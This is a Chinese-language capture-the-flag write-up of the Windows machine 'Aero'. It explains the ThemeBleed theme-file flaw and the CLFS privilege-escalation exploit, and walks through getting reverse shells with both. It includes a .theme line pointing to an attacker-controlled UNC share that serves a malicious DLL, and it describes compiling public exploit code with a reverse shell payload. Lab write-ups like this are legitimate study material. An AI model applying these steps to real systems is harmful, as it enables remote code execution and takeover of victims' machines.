# Aero

这个机器利用了今年比较新的cve，关于windows11的漏洞，类似于lnk、scf，但这个危害更高，通过易受攻击的windows11 利用theme、msstyles来实现RCE.

---

Aero 是一台中等难度的 Windows 机器，最近有两个 CVE：CVE-2023-38146（影响 Windows 11 主题）和 CVE-2023-28252（针对通用日志文件系统 （CLFS）。初始访问是通过使用 ThemeBleed 概念验证构建恶意有效负载来实现的，从而导致反向 shell。站稳脚跟后，在用户的主目录中发现 CVE 披露通知，表示存在 CVE-2023-28252 漏洞。需要修改现有概念证明，以便将权限提升到管理员级别或作为 NT Authority\SYSTEM 执行代码。

---

## 外部信息收集

### 端口扫描

循例nmap

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/79bc73e9-cde2-9328-0a81-58d50fb12ed7.png)

虽然对于windows靶机来说这个暴露的端口数量有点奇怪，但扫了两次，确定只有80

### 80 - Windows 11 .theme (CVE-2023-38146)

在网站主页，这里提到了windows 11的主题

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/94ef39dd-a973-250a-e0fd-d29c99951d24.png)

下面还有个文件上传，这个是用来上传主题文件的

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/034fcba7-0da2-905b-5caf-82c57e8586da.png)

我们通过谷歌搜索关于windows 11主题相关的漏洞我们能找到一点线索（虽然在靶机介绍中已经告诉了我们)

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/49fbe978-5ae8-57d0-94c8-2cb59b4bc011.png)

当上传theme文件后，它会测试这个文件

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/9c076e62-010f-0481-266b-4a92716fcf8f.png)

### 分析一下原理

这里研究了一下，中间偷天换日给我一个很不错的感受，其实很简单。

首先.theme文件类似于scf那种的ini文件，而theme需要加载.msstyles文件

	[VisualStyles]
	Path=%SystemRoot%\resources\Themes\Aero\Aero.msstyles

总所周知，我们可以利用windows特色，这里的.msstyles文件很明显，我们能够通过UNC path来访问

	Path=\\10.10.14.18\tb\Aero.msstyles

.msstyles也有版本之分，我们具体关注version 999，看一下uxtheme.dll加载999的msstyles文件会做什么

	if ( return_val < 0 && (_WORD)version == 999 ) // !!! [2] special case for version 999
	  {
		resource_size = 999;
		return_val = ReviseVersionIfNecessary(msstyles_path, 999, (int *)&resource_size); // !!! [3] call to `ReviseVersionIfNecessary`
	...

而函数ReviseVersionIfNecessary对我们而言，会做以下对我们有利的事情：

1. **在.msstyles文件的所在目录**下寻找xxxx_vrf.dll
2. 如果xxxx_vrf.dll文件存在则打开文件验证签名
3. 如果签名有效则关闭该文件，否则直接退出
4. 将xxxx_vrf.dll文件作为DLL加载并调用VerifyThemeVersion函数

看起来确实很安全的样子，**但我相信是得益于UNC path，使它脆弱了**

我们可以看到这个流程下来，xxxx_vrf.dll被加载了两次，如果没有UNC，这一切在windows本地，可能这一切看起来似乎都正常

而我说了是UNC令它发挥了作用，使它脆弱的可利用，这是我自己的理解。

在第三步中，验证完就关闭了文件，到第四步的时候想打开xxxx_vrf.dll的时候，则需要再次通过smb来请求该文件，然而这时候，是不需要再次验证的，而是直接加载的。

所以攻击方法就出来了，等到第三步验证完文件签名后，当易受攻击的windows尝试通过smb请求xxxx_vrf.dll以进行第四步时

在这个时候，当它试图通过smb向我们攻击者请求xxxx_vrf.dll文件时，我们可以控制smb server使其返回一个恶意的dll，由于它不会再进行签名验证，所以会直接加载恶意dll。

[themebleed.py](https://github.com/Jnnshschl/CVE-2023-38146/blob/main/themebleed.py)这个项目利用是themebleed.exe的python版本，我们可以使用themebleed.py在linux上使用x86_64-w64-mingw32-g++对cpp编译成dll并且**对smbserver进行控制，在第四步的时候返回恶意dll文件给受害者**

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/beb1a63c-a81c-e0af-85a6-1843943dbe49.png)

我们通过对themebleed.py源码进行审计就可以很容易就发现这一点，当发确定受害者是第二次请求xxxx_vrf.dll时，则控制smbserver返回恶意dll

现在我们可以开始利用themebleed.py来getshell

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/a422a2de-94b7-aa3d-3879-cde7121dcc49.png)

开启nc监听，同时在80端口上传theme文件

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/dc691ac6-d2c2-f998-7b37-cdb835d6a972.png)

当遇到红色的那行输出时（输出了“evil”字符串是因为我修改的代码），则代表已经在第四步返回了恶意dll

当我们再次查看nc时，我们应该获得了我们想要的

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/4f0c9064-5688-5f3d-7b72-a98a40b35095.png)

user flag在老地方

## 本地权限提升

在Documents目录下发现了这个

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/09f2639e-20fc-e8f7-0d01-4b2397fccf8d.png)

很轻松就找到了关于这个cve的[POC](https://github.com/fortra/CVE-2023-28252)

	针对 Windows 11 21H2， clfs.sys 版本 10.0.22000.1574，虽然它也适用于 Windows 10 21H2、Windows 10 22H2、Windows 11 22H2 和 Windows Server 2022。

把项目下载，搞个powershell reverse shell payload，用vs编译项目

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/4929fc39-ca2e-25b0-6099-3c8eba3f8f7c.png)

通过http上传到目标

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/2caf8847-3708-e2af-025b-ea875bdf09ac.png)

执行exp同时查看nc

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/fde03f7f-1130-46af-9df2-8b0aef08ddd6.png)

root flag还在老地方

